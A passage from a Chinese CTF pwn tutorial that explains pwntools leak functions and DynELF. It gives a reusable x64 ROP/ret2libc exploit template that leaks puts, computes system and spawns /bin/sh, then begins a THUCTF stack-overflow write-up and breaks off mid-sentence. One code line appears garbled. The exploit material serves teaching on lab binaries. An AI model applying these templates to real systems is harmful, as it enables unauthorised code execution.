使用这个 pwntool 模块，最重要的是编写 leak 函数。只要 leak 函数编写好了，你只需要调用对象相应的方法，pwntool
会帮助你自动完成泄露的工作。这里提供两篇文章：
 一个 32 位平台使用 write 写的 leak 函数文章
 一个使用 write、puts 对比写 leak 函数的文章（错误真多）
第二篇错误真的太多了，但是他给初学者一个很重要的启示就是不同的输入输出函数以及不同的平台在编写 leak 的时候是很不一样的！我就按照第一篇例子，分析一下在
32 位平台下他的 leak 函数原理：
    from pwn import *
    elf = ELF('./level2')
    write_plt = elf.symbols['write']
    read_plt = elf.symbols['read']
    # 官方给的 leak 说明是需要出入一个地址，然后放回至少一个字节的该地址的内容！这就是 leak 的外部特性
    def leak(address):
        payload1='a'*140+p32(write_plt)+p32(vuln)+p32(1)+p32(address)+p32(4)
        p.send(payload1)
        data=p.recv(4)
        print "%#x => %s"%(address,(data or ' ').encode('hex'))
        return data
    p = process('./level2')
    d = DynELF(leak,elf=ELF('./level2'))
    system_addr = d.lookup('system', 'libc')
    print "system_addr=" + hex(system_addr)
  * 'a' * 140 是刚好覆盖完缓冲区的情况，后面的内容将开始写入该漏洞函数执行完（返回后）下一条指令存放的栈空间
  * write_plt 链接使用 ELF 的 symbols 得到的，这样不准确，建议直接使用 gdb 看 call write@plt 汇编那一行后面显示的地址，或者在 IDA 中找到 .plt 段查看 write 前面的地址
  * vuln 是漏洞函数的内部第一句汇编代码的地址（不是 call 漏洞函数汇编的地址，也不是溢出点的位置）
  * 1 是 write 需要的三个参数的第一个参数，即表示写入到 stdout
  * address 是需要读取的地址
  * 4 是字节数，是 write 的第三个参数
这样这个 payload1 被溢出后，当漏洞函数结束，EIP 指向 write_plt，去执行，会把此时的栈顶当做下一条返回指令
(vuln)，下面三个栈元素作为参数，因此执行 write 时候会输出 address 地址四个字节，然后又回到 vuln 漏洞函数去执行。
PS：如果读者要自己编写 leak，建议别直接照搬网上的代码，请自己理解清楚后选择 **合适的输出函数** ，按照合适的 **函数传参** ，
**堆栈平衡规则** 去编写！
PS：并且高度重视处理好 **输入输出的缓冲区内容的重要性** ，使用 p.recvuntil 将不必要的输出读掉（尤其注意 \n），不然会影响
p.recv(4) 读取泄露的 address 内容，导致 pwntool 出错！
**小技巧** ：你可以将 leak 单独拿出来，做一个 POC 来测试是否泄露出你指定的地址是否正确来验证你的 leak 是否正确。
##### 双 Payload （推荐）
这是我自己取得名字，其实就是告诉你不必借助 DynELF 模块把上面的 leak 函数 payload1 拿出来作为你的第一个
payload，执行完后在你自己的代码里计算出一些绝对地址和你需要的信息，因为程序回到了漏洞函数的点，你再次编写 payload2 去执行后续的步骤即可。
这里给出一个我的利用 x64 puts 泄露的 ROP 绕过 NX 的 POC 模板（来自解决后文 classic
题目的，会详细讲解），以便以后快速构造利用脚本。用 puts 去泄露挺麻烦的，用其他输出函数泄露会比这个模板简单一些。
    # encoding:utf-8
    from pwn import *
    """
    第一次溢出，获取 put 函数在内存中的真实地址
    通过 put 在内存中的真实地址与 put_libc，计算 system 函数真实内存地址
    第二次溢出，写入 '/bin/sh\0' 到 .bss 段，并利用 ROP 布置好 system 需要的参数，并跳转到 system 函数地址执行
    拿到 Shell
    """
    # libc.so 文件作用是告诉你相对偏移！
    libc = ELF('./libc-2.23.so')
    put_libc = libc.symbols['puts'] 
    # print "%#x" % put_libc # 0x6f690   就是 puts 在 libc 中的偏移（相对地址）！
    system_libc = libc.symbols['system']
    # print "%#x" % system_libc # 0x6f690  就是 puts 在 libc 中的偏移（相对地址）！
    puts_plt = 0x400520   # .plt 段里的 puts 函数地址，你需要一个输出函数
    vuln_addr = 0x4006A9  # 这里填写漏洞函数里面汇编第一个地址
    poprdi_ret = 0x400753 # pop rdi ; ret
    p = process('./classic', env = {'LD_PRELOAD': './libc-2.23.so'})
    address = 0x601018 # 需要泄露的函数在 libc 中的地址，IDA 查看，是 .plt 段这个函数写的 jmp cs:off_601018
    payload1 = 'a'*(48+24)+ p64(poprdi_ret) + p64(address) + p64(puts_plt) + p64(vuln_addr)
    p.sendline(payload1) # 自动添加 \n
    print p.recvuntil('Have a nice pwn!!\n')
    s = p.recvuntil("\n")
    # 后面这些处理是因为 puts 输出长度不定和一些特性导致的，比较复杂
    data = s[:8] # 遇到 0a 很烦，puts 也会终止
    while len(data)  %s" % (address, (data or '').encode('hex')) 
    # 泄露出地址，然后进行攻击
    # 由于 libc 的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露
    data = data.replace("\n", "\0")# 把 puts 替换的 0a 全部换成 00，尤其是 上面 print 输出的末尾那些 0a 必须换！
    put_addr = u64(data) # 8 字节的字符转换为 " 地址格式 "
    print "put_addr: ", hex(put_addr)
    system_addr = put_addr - put_libc + system_libc
    bss_addr = 0x0601060  # IDA segment ，选择 .bss 的 start 地址
    gets_plt = 0x400560
    # 完成 bss_addr 段的写入，并将写入的地址放到 rdi 寄存器，然后调用 system
    payload2 = 'a'*(48+24) + p64(poprdi_ret) + p64(bss_addr) + p64(gets_plt) + p64(poprdi_ret) + p64(bss_addr) + p64(system_addr) + p64(vuln_addr)
    p.recvuntil("Local Buffer >>")
    p.sendline(payload2)
    p.sendline('/bin/sh\0')
    p.interactive()
至此有了 ROP 绕过 NX 的流程和 POC 模板，基本可以解决绝大部分这类题目了！但是解题的时候思路别限死在我说的方法上了，思路活跃非常重要 ~
接下来讲解一道灵活的的 ROP 绕过 NX 的题目，以及一道利用通过 puts 泄露的 POC 模板解决的题目。
### THUCTF - stackoverflowwithoutleak
IDA64 打开程序，F5 浏览程序逻辑（当然大佬都是直接看汇编的），找到如下函数：
很明显存在缓冲区溢出漏洞，我们使用 checksec.sh 检查一下程序保护机制：
开启了 **NX 保护** ：NX 即 No-execute （不可执行）的意思，NX
（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU
就会抛出异常，而不是去执行恶意指令。
考虑使用 ROP 绕过 NX 保护，但是我们不知道 libc.so 加载基地址，再次观察 IDA 发现：
ROP(Return Oriented Programming) 即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中 **已有的小片段